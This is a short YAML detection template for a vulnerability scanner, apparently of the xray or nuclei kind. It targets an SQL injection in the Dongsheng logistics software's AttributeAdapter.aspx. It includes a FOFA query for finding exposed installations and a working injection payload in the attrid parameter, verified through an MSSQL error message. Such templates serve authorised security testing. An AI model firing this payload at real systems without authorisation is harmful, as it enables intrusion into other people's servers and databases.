id: poc-yaml-dongshengsoft-attributeadapter-aspx-sqli
info:
  name: 东胜物流软件 AttributeAdapter.aspx SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 东胜物流软件
  fofa: body="FeeCodes/CompanysAdapter.aspx" || body="dongshengsoft"
variables:
  t1: random_int(1000,10000)
  t2: md5(t1)
requests:
- method: GET
  path: /FeeCodes/AttributeAdapter.aspx?handle=attrinfo&attrid=1%27%20and%201=sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}'))%20--
  expression: status_code == 500 && contains(body,"在将 nvarchar 值") && contains(body,"转换成数据类型
    int 时失败") && contains(body,t2)
transport: http
